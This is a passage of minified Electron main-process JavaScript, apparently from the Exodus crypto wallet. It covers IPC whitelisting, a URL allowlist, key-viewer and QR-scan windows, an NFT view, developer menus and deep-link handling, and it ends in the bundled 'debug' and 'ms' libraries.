			if (!0 !== t(r)) return;
			const i = n ? y(o) : o;
			return e(r, ...i)
		};
		return m.set(e, i), i
	}
	n.d(t, "mainBroadcastListener", function() {
		return O
	}), n.d(t, "targeted", function() {
		return C
	}), n.d(t, "broadcast", function() {
		return j
	}), n.d(t, "rpcMain", function() {
		return L
	}), n.d(t, "rpcListener", function() {
		return I
	}), n.d(t, "createServer", function() {
		return N
	});
	const g = (v = r.ipcMain, E = function(e) {
		return !!f(e.sender) || (Object(i.a)("send to IPC from non-whitelisted webContents"), !1)
	}, {
		on(e, t, n = !0) {
			v.on(e, b(t, E, n))
		},
		once(e, t, n = !0) {
			v.once(e, b(t, E, n))
		},
		removeListener(e, t) {
			v.removeListener(e, m.get(t))
		},
		removeAllListeners(e) {
			v.removeAllListeners(e)
		},
		handle(e, t, n = !0) {
			v.handle(e, b(t, E, n))
		},
		removeHandler(e) {
			v.removeHandler(e)
		},
		send(...e) {
			v.send(...e)
		},
		sendSync: (...e) => v.sendSync(...e),
		invoke: (...e) => v.invoke(...e)
	});
	var v, E;
	let S = !1;
	async function k(e, t, n, r) {
		if (!r) throw new Error("Can not send without origin!");
		await
		function(e) {
			return new Promise(t => {
				if (!e.isLoading()) return t();
				e.once("did-finish-load", t), setImmediate(() => {
					e.isLoading() || (e.removeListener("did-finish-load", t), t(), S || (S = !0, console.log("Caught and prevented a race condition in RPC awaitLoad()")))
				})
			})
		}(e), e.send(t, {
			channel: t,
			payload: n,
			origin: r
		})
	}

	function x(e, t, n, r) {
		if ("#" === e) throw new Error("Can not send to self");
		if (!r || !e) throw new Error("Can not send without target and origin");
		const s = (c = e, d().filter(e => e.type === c).map(e => e.contents));
		var c;
		0 === s.length ? o.e && console.log(`[ipc]: (${r} -> ${e}) 0 processes to send to on "${t}"`) : s.length > 1 && o.e && Object(i.a)("targeted send to multiple webContents"), s.forEach(e => k(e, t, n, r))
	}

	function O() {
		g.on("ipc:target:send", (e, {
			target: t,
			channel: n,
			payload: r
		}) => {
			x(t, n, r, f(e.sender))
		}, !1)
	}

	function C(e, t, n) {
		x(e, t, n, "#")
	}

	function j(e, t) {
		! function(e, t, n) {
			d().forEach(({
				contents: r
			}) => k(r, e, t, n))
		}(e, t, "#")
	}
	const {
		on: _,
		once: F,
		removeListener: P,
		removeAllListeners: D,
		handle: B,
		removeHandler: T
	} = g, L = {
		on: _,
		once: F,
		removeListener: P,
		removeAllListeners: D,
		handle: B,
		removeHandler: T
	}, I = L;

	function N(...e) {
		return a(g, C, e => f(e.sender), ...e)
	}
}, function(e, t, n) {
	"use strict";
	n.r(t);
	var r = {};
	n.r(r), n.d(r, "setUserPath", function() {
		return ue
	}), n.d(r, "getDebugFile", function() {
		return le
	}), n.d(r, "isExistsSync", function() {
		return fe
	}), n.d(r, "isExists", function() {
		return de
	}), n.d(r, "create", function() {
		return pe
	}), n.d(r, "remove", function() {
		return he
	});
	var o = n(28),
		i = n.n(o),
		s = n(0),
		c = n(33),
		a = n.n(c),
		u = n(4),
		l = n(18),
		f = n(8);
	const d = [/^https:\/\/support\.exodus\.(io|com)\/[a-zA-Z0-9/_-]*(#[a-zA-Z0-9%_-]+)?$/, /^https:\/\/etherscan\.io\/tx\/0x[a-zA-Z0-9]+$/, /^https:\/\/polygonscan\.com\/tx\/0x[a-zA-Z0-9]+$/, /^https:\/\/compound\.finance\/[a-zA-Z0-9/_-]*$/, /^https:\/\/youtu\.be\/jRLOG8fLwuA$/, /^https:\/\/compound\.finance\/documents\/Compound\.Whitepaper\.pdf$/],
		p = [/^support@exodus\.(io|com)$/];

	function h(e, t) {
		return "string" == typeof e ? e === t : e.test(t)
	}

	function y(e) {
		if ("string" != typeof e) return !1;
		let t;
		try {
			t = new URL(e)
		} catch (e) {
			return !1
		}
		if (t.href !== e) return !1;
		if (!e.startsWith(t.protocol)) return !1;
		switch (t.protocol) {
			case "mailto:":
				if (e !== `mailto:${t.pathname}${t.search}`) return !1;
				if (t.search) {
					if (![`?${t.searchParams}`, `?${function(e){const t=[];for(const[n,r]of e)t.push(`${encodeURIComponent(n)}=${encodeURIComponent(r)}`);return t.join("&")}(t.searchParams)}`].includes(t.search)) return !1;
					const e = new Set(["subject", "body"]);
					for (const [n] of t.searchParams)
						if (!e.has(n)) return !1
				}
				return p.some(e => h(e, t.pathname));
			case "https:":
				return d.some(t => h(t, e))
		}
		return !1
	}
	var m = n(3),
		w = n(67),
		b = n.n(w),
		g = n(25),
		v = n(23),
		E = n(11),
		S = n(5),
		k = n(10),
		x = n(24);
	const O = {
		...k.a,
		backgroundColor: "#FFFFFF",
		fullscreen: !1,
		fullscreenable: !1,
		width: 900,
		height: 500,
		show: !1,
		title: "PRIVATE KEYS",
		minimizable: !1,
		maximizable: !1,
		alwaysOnTop: !0,
		webPreferences: {
			...k.c,
			partition: "keyviewer"
		},
		modal: !0
	};
	let C = null;
	let j = 0;
	var _ = n(14);
	const F = {
		transparent: !0,
		width: 850,
		height: 500,
		show: !0,
		fullscreen: !1,
		fullscreenable: !1,
		maximizable: !1,
		minimizable: !1,
		resizable: !1,
		title: "Scan QR Code",
		webPreferences: {
			...k.c,
			partition: "scan-qr"
		},
		frame: !1
	};
	let P, D = !1;

	function B(e, t, n) {
		if (console.log(`[app-run] EVENT wallet:qrCodeScan: payload = ${n&&JSON.stringify(n)}`), !n || n.assetName)
			if (P) P.send("wallet:qr:changeState", n), P.show(), e.hide();
			else {
				if (D) return;
				D = !0,
					function(e, t, n) {
						const r = new s.BrowserWindow(F);
						Object(f.registerWebContents)(r.webContents, "scan-qr"), Object(_.a)(r.webContents, "scan-qr"), r.loadURL(Object(x.a)({
							app: s.app,
							filePath: S.i,
							hash: Object(g.a)(e)
						})), Object(v.a)() && (Object(E.a)({
							windowHandle: r.webContents,
							windowId: "scanQR"
						}), r.webContents.zoomFactor = n.webContents.zoomFactor, r.show());
						let o = !1;
						return s.app.on("before-quit", () => {
							o = !0, r.isDestroyed() || r.close()
						}), r.on("close", e => {
							o || (e.preventDefault(), r.hide())
						}), new Promise((e, t) => {
							r.webContents.once("dom-ready", () => {
								r.show(), e(r)
							})
						})
					}(n, 0, t).then(t => {
						P = t, e.hide(), t.on("close", () => {
							e.show()
						}), D = !1
					})
			}
		else n && n.qrData ? (P.hide(), e.show(), console.log(`[app-run] QR code decoded: ${n.qrData}`), t.webContents.send("wallet:qrCodeValue", n.qrData)) : n.error && (console.log(`[app-run] QR scan window error: ${n.error}`), P.hide(), e.show())
	}
	u.rpcMain.on("keyviewer-process:init", (e, t) => {
		m.a.keyviewer || (m.a.keyviewer = function(e, t, n) {
			return O.webPreferences.partition = `keyviewer-${j++}`, C = new s.BrowserWindow({
				...O,
				parent: e
			}), Object(f.registerWebContents)(C.webContents, "keyviewer"), C.loadURL(Object(x.a)({
				app: s.app,
				hash: Object(g.a)(n),
				filePath: S.d
			})), Object(v.a)() && Object(E.a)({
				windowHandle: C.webContents,
				windowId: "keyviewer"
			}), C.on("close", e => {
				setImmediate(() => {
					C.destroy()
				})
			}), C.webContents.once("dom-ready", () => {
				C.webContents.zoomFactor = t.webContents.zoomFactor, C.show()
			}), C
		}(m.a.background, m.a.ui, t), m.a.keyviewer.webContents.once("dom-ready", () => {
			e.sender.send("keyviewer-process:opened")
		}), m.a.keyviewer.once("closed", () => {
			delete m.a.keyviewer
		}))
	}), u.rpcMain.on("keyviewer-process:close", (e, t) => {
		m.a.keyviewer.hide(), m.a.keyviewer.destroy()
	}), u.rpcMain.on("wallet:qrCodeScan", (e, t) => {
		B(m.a.background, m.a.ui, t)
	}), u.rpcMain.on("ui:set-navbar-height", (e, t) => {
		for (const e of l.c) e(t.navbarHeight)
	}), u.rpcMain.handle("has-media-access", async (e, t) => {
		if ("camera" === t) {
			if (!("darwin" === process.platform && Number(a.a.release().split(".")[0]) >= 18)) return !0
		}
		return "granted" === s.systemPreferences.getMediaAccessStatus(t) || s.systemPreferences.askForMediaAccess(t)
	}), u.rpcMain.handle("openExternal", async (e, t) => {
		if (!y(t)) throw new Error("Navigation request declined");
		await s.shell.openExternal(t, {
			activate: !0
		})
	}), u.rpcMain.handle("openExternal:unchecked", async (e, t) => {
		const {
			permissions: n = []
		} = Object(f.getWebContentsMeta)(e.sender);
		if (!n.includes("openExternal")) throw new Error("Do not have openExternal permission");
		await s.shell.openExternal(t, {
			activate: !0
		})
	}), u.rpcMain.handle("get-machine-id", async () => {
		const e = a.a.networkInterfaces();
		for (const [t, n] of Object.entries(e)) {
			if (t.startsWith("lo") || t.startsWith("Loopback")) continue;
			const e = n.find(e => e.address && e.mac && "IPv4" === e.family);
			if (e) {
				const t = i.a.createHash("sha256");
				return t.update(e.mac), t.digest("hex")
			}
		}
	}), u.rpcMain.handle("dialog:open", (e, t) => {
		const n = s.BrowserWindow.getFocusedWindow();
		return s.dialog.showOpenDialog(n, t)
	});
	for (const [e, t] of b.a.on) u.rpcMain.on(e, t);
	for (const [e, t] of b.a.handle) u.rpcMain.handle(e, t);
	var T = n(83),
		L = n.n(T),
		I = n(82),
		N = n.n(I),
		M = n(1),
		A = n.n(M),
		$ = n(13),
		U = n(2),
		R = n(21),
		W = n.n(R);
	const z = !U.g,
		V = ["file-system", "notifications", "permissions-api", "presentation-api", "speech-api", "pepper-3d", "shared-workers", ["blink-features", ["FileSystem", "MediaSession", "Serial", "WebAuth", "WebBluetooth", "WebGPU", "WebHID", "WebNFC", "WebOTP", "WebUSB", "WebXR", "WebScheduler", "WindowPlacement", "WindowSegments"].join(",")],
			["features", ["Reporting", "WebAuthentication", "WebNFC", "WebOTP", "WebUSB", "WebXR"].join(",")]
		];
	var q = [...[], ...(z || U.b, []), ...V],
		K = n(15),
		J = n(20),
		H = n(29),
		G = n.n(H),
		Y = n(26);
	let X = null;
	const Z = () => {
		m.a.background.removeBrowserView(X), m.a.ui.webContents.focus()
	};
	let Q = 0;
	const ee = e => {
		Q = e || Q, X && Object(J.updateViewBounds)(X, Q)
	};
	Y.c.add(() => ee()), l.c.add(ee), s.protocol.registerSchemesAsPrivileged([...J.schemes, {
		scheme: "exodus-nfts-api",
		privileges: {
			bypassCSP: !0,
			secure: !0,
			supportFetchAPI: !0
		}
	}]), u.rpcMain.handle("nfts:load", async () => {
		if (X) throw new Error("Already loaded!");
		X = new s.BrowserView({
			webPreferences: {
				webSecurity: !0,
				enableRemoteModule: !1,
				contextIsolation: !0,
				nodeIntegration: !1,
				nodeIntegrationInWorker: !1,
				partition: "nfts",
				sandbox: !0,
				spellcheck: !1,
				webgl: !1,
				plugins: !1,
				safeDialogs: !0,
				disableDialogs: !0,
				backgroundColor: "#00000000",
				transparent: !0
			},
			transparent: !0
		}), Object(f.registerWebContents)(X.webContents, "nfts"), Object(K.registerBrowserView)(X), Object(J.updateViewBounds)(X, Q), X.setAutoResize({
			width: !0,
			height: !0
		}), m.a.ui.webContents.on("devtools-reload-page", () => {
			Z(), Object(K.destroyBrowserView)(X)
		});
		const {
			session: e
		} = X.webContents;
		e.protocol.registerStringProtocol("exodus-nfts-api", (e, t) => {
			try {
				const t = new $.URL(e.url).searchParams.get("data");
				if (!t) throw new Error("No message found in nfts IPC request!");
				m.a.ui.webContents.send("exodus-nfts-api", {
					messageString: t
				})
			} catch (e) {
				console.error("Could not parse exodus-nfts-api request!"), console.error(e)
			}
			t({
				mimeType: "text/plain",
				data: "ok"
			})
		}), U.e && Object(J.showDevTools)(X), await X.webContents.loadFile(S.g), X.webContents.debugger.attach("1.3"), X.webContents.on("devtools-reload-page", () => {
			Object(u.targeted)("ui", "nfts-reload")
		})
	}), u.rpcMain.handle("nfts:showDevTools", async () => {
		Object(J.showDevTools)(X)
	}), u.rpcMain.handle("nfts:show", () => {
		m.a.background.addBrowserView(X), m.a.background.setTopBrowserView(m.a.ui), Object(J.updateViewBounds)(X, Q), Object(J.refocusView)(X)
	}), u.rpcMain.handle("nfts:hide", () => {
		Z()
	}), u.rpcMain.handle("nfts:goBack", () => {
		const e = X.webContents.canGoBack();
		return e && X.webContents.goBack(), e
	}), u.rpcMain.handle("nfts:api-receive", async (e, {
		dataString: t
	}) => {
		const n = JSON.stringify(JSON.parse(t));
		await X.webContents.executeJavaScript(`window._exodus_nfts_api.receive(${G()(n)}),0`)
	}), u.rpcMain.on("nfts:pointer", (e, t) => {
		const n = Object(J.toInputEvent)(t);
		n && (["mousedown", "click"].includes(t.type) && X.webContents.focus(), X.webContents.debugger.sendCommand("Input.dispatchMouseEvent", n))
	});
	var te = (e, t) => {
			if (m.a.background.webContents.zoomFactor === e) return;
			const n = U.l * e,
				r = U.k * e;
			m.a.background.setMinimumSize(n, r);
			const [o, i] = m.a.background.getSize();
			return (t || o < n || i < r) && ((e, t) => {
				try {
					m.a.background.setSize(e, t, !1)
				} catch (e) {
					console.error("failed to update window size", e)
				}
			})(n, r), Object(K.allWebContents)().forEach(t => {
				t.zoomFactor = e, Object(J.updateAllViewsBounds)(), ee()
			}), e
		},
		ne = n(12),
		re = n.n(ne),
		oe = n(9),
		ie = n.n(oe),
		se = n(45),
		ce = n.n(se);
	let ae;

	function ue(e) {
		ae = e
	}

	function le() {
		const e = ce()(process.argv),
			t = ae || e.datadir || s.app && s.app.getPath("userData");
		return A.a.join(t, "debug")
	}

	function fe() {
		const e = le();
		return ie.a.existsSync(e)
	}

	function de(e) {
		const t = le();
		return ie.a.access(t, t => e(!t))
	}

	function pe(e) {
		const t = le();
		de(n => {
			if (n) return e(!0);
			ie.a.writeFile(t, "", t => e(null === t))
		})
	}

	function he(e) {
		const t = le();
		de(n => {
			if (!n) return e(!0);
			ie.a.remove(t, t => e(null === t))
		})
	}
	var ye = n(55),
		me = n(54),
		we = n(53),
		be = n(38),
		ge = n(40);

	function ve(e, ...t) {
		if ("function" != typeof e) throw new Error("Fist argument should be a function");
		const n = `(${e.toString()})(${t.map(e=>G()(e)).join(", ")})`;
		return () => Object(l.a)().webContents.executeJavaScript(n)
	}
	const Ee = re()(["Restore", [
			["Restore from 12-word phrase...", ve(() => globalThis.Exodus.restore.fromRecoveryPhrase())],
			["Restore from recovery link...", ve(() => globalThis.Exodus.restore.fromRecoveryLink())],
			["Restore from Safe Report...", ve(() => globalThis.Exodus.import.safeReport.importFile())]
		]]),
		Se = re()(["Data Folder", [
			["Open Data Folder", () => s.shell.showItemInFolder(s.app.getPath("userData"))],
			["Export Zipped Data Folder", ve(() => globalThis.Exodus.export.dir.data())],
			["Export Zipped Wallet Folder", ve(() => globalThis.Exodus.export.dir.wallet())]
		]]),
		ke = re()(["Manage Portfolios", [
			["Enable All", ve(() => globalThis.Exodus.portfolios.enableAll())]
		]]),
		xe = re()(["Notifications", [
			["On", {
				type: "radio",
				checked: !0
			}, ve(() => globalThis.flux.actions.config.notifications.tx.receive.enable())],
			["Off", {
				type: "radio",
				checked: !1
			}, ve(() => globalThis.flux.actions.config.notifications.tx.receive.disable())]
		]]),
		Oe = re()(["Sound", [
			["Volume", [...Array(10).keys()].map(e => 10 * (e + 1)).map(e => [`${e}%`, {
				type: "radio",
				checked: 100 === e
			}, ve(e => globalThis.flux.actions.config.sounds.all.setVolume(e), e / 100)])],
			["Test Volume Level", ve(() => globalThis.flux.store.dispatch({
				type: "TEST_VOLUME"
			}))]
		]]),
		Ce = e => {
			const t = `(${(e=>globalThis.flux.actions.config.updateZoomFactor(e)).toString()})(${G()(e)})`;
			Object(l.a)().webContents.executeJavaScript(t)
		},
		je = re()(["Zoom", [
			["50%", {
				type: "radio",
				checked: !1
			}, () => Ce(.5)],
			["75%", {
				type: "radio",
				checked: !1
			}, () => Ce(.75)],
			["100%", {
				type: "radio",
				checked: !0
			}, () => Ce(1)],
			["150%", {
				type: "radio",
				checked: !1
			}, () => Ce(1.5)],
			["200%", {
				type: "radio",
				checked: !1
			}, () => Ce(2)],
			["300%", {
				type: "radio",
				checked: !1
			}, () => Ce(3)]
		]]),
		_e = re()(["Windows", [
			["Network", [
				["Visible", {
					type: "checkbox",
					checked: !1
				}, e => {
					const t = Object(we.a)();
					t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
				}]
			]],
			["Wallet", [
				["Visible", {
					type: "checkbox",
					checked: !1
				}, e => {
					const t = Object(ge.a)();
					t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
				}]
			]],
			["Monero", [
				["Visible", {
					type: "checkbox",
					checked: !1
				}, e => {
					const t = Object(me.a)();
					t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
				}]
			]],
			["Core", [
				["Visible", {
					type: "checkbox",
					checked: !1
				}, e => {
					const t = Object(ye.a)();
					t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
				}]
			]],
			["Unlock", [
				["Dev Tools Visible", {
					type: "checkbox",
					checked: !1
				}, e => {
					const t = Object(be.a)();
					e.checked = !t.webContents.isDevToolsOpened(), t.webContents.isDevToolsOpened() ? t.webContents.closeDevTools() : t.webContents.openDevTools()
				}]
			]]
		]]),
		Fe = re()(["Debug Mode", [
			["On", {
				type: "radio",
				checked: fe()
			}, function() {
				fe() || Pe()
			}],
			["Off", {
				type: "radio",
				checked: !fe()
			}, function() {
				fe() && Pe()
			}]
		]]);

	function Pe() {
		r[fe() ? "remove" : "create"](async e => {
			e ? await s.dialog.showMessageBox({
				title: "Restart",
				message: `Debug mode is now ${fe()?"on":"off"}. Please restart Exodus to activate the changes.`,
				buttons: ["OK"]
			}) : await s.dialog.showMessageBox({
				title: "Error",
				message: "There was a problem! Debug mode could not be changed!",
				buttons: ["OK"]
			})
		})
	}
	var De = re()(["Developer", [Ee, Se, xe, Oe, _e, je, "-", ["Open Developer Tools", () => Object(E.a)()],
		["Open Current App Developer Tools", ve(() => globalThis.Exodus.dapps.showDevTools())], Fe, "-", ["Export Safe Report Data", ve(() => globalThis.Exodus.export.safeReport.dumpDiagnostics())], ...R.PERF_METRICS_FEATURES ? [
			["Export Performance Metrics", ve(() => globalThis.Exodus.export.performanceMetrics.exportToFile())]
		] : [],
		["Export All Transactions", ve(() => globalThis.Exodus.export.transactions.exportTransactionsAllWalletAccounts())], ke
	]]);
	const Be = (() => U.c ? "Exodus" : U.b ? "Eden" : U.d)();
	let Te;
	var Le = Te = "darwin" === process.platform ? re()([Be, [
			["About " + Be, "about"], De, "-", {
				...re()(["Services", "services"]),
				submenu: []
			}, "-", ["Hide " + Be, "Command+H", "hide"],
			["Hide Others", "Command+Shift+H", "hideothers"],
			["Show All", "unhide"], "-", ["Quit", "Command+Q", s.app.quit.bind(s.app)]
		].filter(e => !!e)]) : re()(["File", [
			["Quit", "Command+Q", s.app.quit.bind(s.app)]
		].filter(e => !!e)]),
		Ie = re()(["Edit", [
			["Undo", "CmdOrCtrl+Z", "undo"],
			["Redo", "Shift+CmdOrCtrl+Z", "redo"], "-", ["Cut", "CmdOrCtrl+X", "cut"],
			["Copy", "CmdOrCtrl+C", "copy"],
			["Paste", "CmdOrCtrl+V", "paste"],
			["Select All", "CmdOrCtrl+A", "selectall"]
		]]),
		Ne = re()(["Window", [
			["Minimize", "CmdOrCtrl+M", "minimize"]
		]]);
	const Me = [Le];
	Me.push(Ie), "darwin" !== process.platform && Me.push(De), Me.push(Ne);
	const Ae = s.Menu.buildFromTemplate(Me),
		$e = () => "darwin" === process.platform ? Re(Re(Ae, Be).submenu, "Developer").submenu : Re(Ae, "Developer").submenu,
		Ue = (e, t) => {
			e.items.forEach(e => t(e)), e.items.map(e => e.submenu).filter(e => e).forEach(e => Ue(e, t))
		};
	u.rpcMain.once("two-factor:enabled", async () => {
		const e = $e();
		Ue(e, e => {
			e.exodusIncompatibleWithTwoFactorAuth && (e.enabled = !1)
		})
	});
	const Re = (e, t) => e.items.find(e => e.label === t);
	u.rpcMain.on("config:notifications", (e, {
		volumeLevel: t,
		notificationsTxReceivedEnabled: n,
		zoomFactor: r,
		onStartup: o
	}) => {
		const i = $e();
		Re(Re(i, "Notifications").submenu, n ? "On" : "Off").checked = !0;
		const s = Re(i, "Sound"),
			c = Re(s.submenu, "Volume");
		Re(c.submenu, `${parseInt(100*t)}%`).checked = !0;
		const a = Re(i, "Zoom");
		Re(a.submenu, `${parseInt(100*r)}%`).checked = !0, te(r, !o)
	});
	var We = Ae;
	const ze = e => {
		if (!e || !(e => {
				return new RegExp(`^${U.o}://fiat-(on|off)ramp`).test(e)
			})(e)) return;
		const {
			host: t,
			path: n,
			params: r
		} = (e => {
			const {
				hostname: t,
				pathname: n,
				searchParams: r
			} = new URL(e);
			return {
				host: t,
				path: n.slice(1),
				params: Object.fromEntries(r.entries())
			}
		})(e);
		m.a.ui.webContents.send("fiat-onramp:data", {
			host: t,
			path: n,
			params: r
		}), m.a.background.show()
	};
	var Ve = n(37);
	U.b && s.app.setName("Eden"), s.app.commandLine.appendSwitch("disable-renderer-backgrounding"), s.app.commandLine.appendSwitch("autoplay-policy", "no-user-gesture-required"), process.env.EXODUS_DISABLE_GPU && s.app.disableHardwareAcceleration();
	for (const e of q) Array.isArray(e) ? s.app.commandLine.appendSwitch(`disable-${e[0]}`, e[1]) : s.app.commandLine.appendSwitch(`disable-${e}`);
	process.env.ELECTRON_FORCE_WINDOW_MENU_BAR = !0;
	const qe = n(45)(process.argv);
	if (U.h) console.log("TEST MODE");
	else {
		const e = ["_", "datadir", "debug", "disable-gpu", "p"];
		0, (!Object.keys(qe).every(t => e.includes(t)) || qe._.length > 2) && (console.error("Can only pass whitelisted args; exiting", qe), s.app.exit())
	}
	qe.datadir ? s.app.setPath("userData", A.a.resolve(qe.datadir)) : U.b && s.app.setPath("userData", A.a.join(s.app.getPath("appData"), "Exodus Eden")), qe._.length > 1 && (globalThis.OPENED_URL = qe._[1]);
	const Ke = new RegExp(`^${U.o}://securitize`),
		Je = e => Ke.test(e),
		He = e => {
			const {
				pathname: t,
				searchParams: n
			} = new $.URL(e);
			return {
				path: t.slice(1),
				params: Object.fromEntries(n.entries())
			}
		};

	function Ge(e) {
		if (!e || !Je(e)) return;
		const {
			path: t,
			params: n
		} = He(e);
		m.a.ui.webContents.send("securitize:data", {
			path: t,
			params: n
		})
	}

	function Ye(e, t) {
		e.preventDefault(), console.log("OPEN URL: " + t), globalThis.OPENED_URL = t, Ge(t), ze(t)
	}
	s.app.on("open-file", Ye), s.app.on("open-url", Ye), u.rpcMain.on("securitize:fetch-data", () => {
		Ge(globalThis.OPENED_URL)
	}), u.rpcMain.on("securitize:fake-deep-link", (e, t) => {
		Ge(`${U.o}://securitize?${new URLSearchParams(t)}`)
	}), u.rpcMain.on("window:focus", () => {
		console.log("received window:focus request"), m.a.background.show()
	}), u.rpcMain.on("window:fetchIsFocused", () => {
		console.log("received window:fetchIsFocused request");
		const e = m.a.background.isFocused();
		m.a.ui.webContents.send("window:isFocused", {
			isFocused: e
		})
	});
	const Xe = fe();
	(qe.debug || process.env.DEBUG_MODE || U.e || Xe) && (console.log("DEBUG MODE"), globalThis.DEBUG_MODE = qe.debug || process.env.DEBUG_MODE || !0);
	let Ze = !1;
	s.app.on("window-all-closed", function() {
		Ze && s.app.quit()
	}), process.on("uncaughtException", function(e) {
		console.error("Uncaught Exception", e && e.message || e), e && e.stack && console.error("Stacktrace", e.stack)
	}), process.on("unhandledRejection", function(e, t) {
		console.error(`Unhandled rejection: ${e&&e.stack||e}`)
	});
	const Qe = N()(() => {
		s.app.quit()
	});
	["SIGINT", "SIGTERM", "SIGQUIT", "beforeExit"].forEach(e => process.once(e, Qe)), s.Menu.setApplicationMenu(null), u.rpcMain.once("app:showDevMenu", () => {
		s.Menu.setApplicationMenu(We)
	}), u.rpcMain.on("app:showPopupMenu", (e, t) => {
		s.Menu.buildFromTemplate(t).popup(s.BrowserWindow.getFocusedWindow())
	}), s.app.on("ready", async () => {
		W.a.instantEvent("appReady");
		const e = s.app.requestSingleInstanceLock();
		if (s.app.on("second-instance", function(e, t, n) {
				const r = m.a.background;
				r.isMinimized() && r.restore(), r.focus(), Ge(t.find(e => Je(e)))
			}), !e) return console.error("Another instance of Exodus is already running. Please close it and try again."), void(globalThis.OPENED_URL && -1 !== globalThis.OPENED_URL.indexOf("recover") ? setTimeout(() => {
			s.dialog.showMessageBoxSync({
				title: "Wallet restore",
				message: "Please close opened Exodus and try again.",
				buttons: ["OK"]
			}), s.app.quit()
		}, 2e3) : setTimeout(s.app.quit.bind(s.app), 1e3));
		const t = s.app.getPath("userData");
		console.log(`Exodus (production): DATA DIR: ${t}`), Object(u.mainBroadcastListener)();
		try {
			Object(m.b)(qe)
		} catch (e) {
			console.error(e)
		}
		Ze = !0, setImmediate(() => {
			try {
				if ("linux" === process.platform) {
					const e = m.a.background.webContents.getOwnerBrowserWindow(),
						[t, n] = e.getSize();
					e.setSize(t + 1, n + 1), e.setSize(t - 1, n - 1)
				}
			} catch (e) {
				console.log("Automatic resize failed — Do a manual window resize to fix black screen.", e.message)
			}
			if ("darwin" === process.platform) s.Menu.setApplicationMenu(We);
			else {
				const e = () => {
					s.Menu.setApplicationMenu(We);
					const {
						height: e,
						width: t,
						titleBarHeight: n
					} = Object(Ve.a)(m.a.background);
					m.a.ui.setBounds({
						x: 0,
						y: n,
						width: t,
						height: e
					})
				};
				for (const t of [m.a.background, m.a.ui]) L.a.register(t, "CmdOrCtrl+Shift+D", e)
			}
		})
	})
}, function(e) {
	e.exports = ["about", "close", "copy", "cut", "delete", "front", "help", "hide", "hideothers", "minimize", "paste", "pasteandmatchstyle", "quit", "redo", "resetzoom", "selectall", "services", "startspeaking", "stopspeaking", "togglefullscreen", "undo", "unhide", "window", "zoom", "zoomin", "zoomout"]
}, function(e, t) {
	e.exports = require("tty")
}, function(e, t, n) {
	const r = n(93),
		o = n(32);
	t.init = function(e) {
		e.inspectOpts = {};
		const n = Object.keys(t.inspectOpts);
		for (let r = 0; r < n.length; r++) e.inspectOpts[n[r]] = t.inspectOpts[n[r]]
	}, t.log = function(...e) {
		return process.stderr.write(o.format(...e) + "\n")
	}, t.formatArgs = function(n) {
		const {
			namespace: r,
			useColors: o
		} = this;
		if (o) {
			const t = this.color,
				o = "[3" + (t < 8 ? t : "8;5;" + t),
				i = `  ${o};1m${r} [0m`;
			n[0] = i + n[0].split("\n").join("\n" + i), n.push(o + "m+" + e.exports.humanize(this.diff) + "[0m")
		} else n[0] = function() {
			if (t.inspectOpts.hideDate) return "";
			return (new Date).toISOString() + " "
		}() + r + " " + n[0]
	}, t.save = function(e) {
		e ? process.env.DEBUG = e : delete process.env.DEBUG
	}, t.load = function() {
		return process.env.DEBUG
	}, t.useColors = function() {
		return "colors" in t.inspectOpts ? Boolean(t.inspectOpts.colors) : r.isatty(process.stderr.fd)
	}, t.destroy = o.deprecate(() => {}, "Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`."), t.colors = [6, 2, 3, 4, 5, 1];
	try {
		const e = n(! function() {
			var e = new Error("Cannot find module 'supports-color'");
			throw e.code = "MODULE_NOT_FOUND", e
		}());
		e && (e.stderr || e).level >= 2 && (t.colors = [20, 21, 26, 27, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 56, 57, 62, 63, 68, 69, 74, 75, 76, 77, 78, 79, 80, 81, 92, 93, 98, 99, 112, 113, 128, 129, 134, 135, 148, 149, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 178, 179, 184, 185, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 214, 215, 220, 221])
	} catch (e) {}
	t.inspectOpts = Object.keys(process.env).filter(e => /^debug_/i.test(e)).reduce((e, t) => {
		const n = t.substring(6).toLowerCase().replace(/_([a-z])/g, (e, t) => t.toUpperCase());
		let r = process.env[t];
		return r = !!/^(yes|on|true|enabled)$/i.test(r) || !/^(no|off|false|disabled)$/i.test(r) && ("null" === r ? null : Number(r)), e[n] = r, e
	}, {}), e.exports = n(69)(t);
	const {
		formatters: i
	} = e.exports;
	i.o = function(e) {
		return this.inspectOpts.colors = this.useColors, o.inspect(e, this.inspectOpts).split("\n").map(e => e.trim()).join(" ")
	}, i.O = function(e) {
		return this.inspectOpts.colors = this.useColors, o.inspect(e, this.inspectOpts)
	}
}, function(e, t) {
	var n = 1e3,
		r = 60 * n,
		o = 60 * r,
		i = 24 * o,
		s = 7 * i,
		c = 365.25 * i;

	function a(e, t, n, r) {
		var o = t >= 1.5 * n;
		return Math.round(e / n) + " " + r + (o ? "s" : "")
	}
	e.exports = function(e, t) {
		t = t || {};
		var u = typeof e;
		if ("string" === u && e.length > 0) return function(e) {
			if ((e = String(e)).length > 100) return;
			var t = /^(-?(?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|weeks?|w|years?|yrs?|y)?$/i.exec(e);
			if (!t) return;
			var a = parseFloat(t[1]);
			switch ((t[2] || "ms").toLowerCase()) {
				case "years":
				case "year":
				case "yrs":
				case "yr":
				case "y":
					return a * c;
				case "weeks":
				case "week":
				case "w":
					return a * s;
				case "days":
				case "day":
				case "d":
					return a * i;
				case "hours":
				case "hour":
				case "hrs":
				case "hr":
				case "h":
					return a * o;
				case "minutes":
				case "minute":
				case "mins":
				case "min":
				case "m":
					return a * r;
				case "seconds":
				case "second":
				case "secs":
				case "sec":
				case "s":
					return a * n;
				case "milliseconds":
				case "millisecond":
				case "msecs":
				case "msec":
				case "ms":
					return a;
				default:
					return
			}
		}(e);
		if ("number" === u && isFinite(e)) return t.long ? function(e) {
			var t = Math.abs(e);
			if (t >= i) return a(e, t, i, "day");
			if (t >= o) return a(e, t, o, "hour");
			if (t >= r) return a(e, t, r, "minute");
			if (t >= n) return a(e, t, n, "second");
			return e + " ms"
		}(e) : function(e) {
			var t = Math.abs(e);
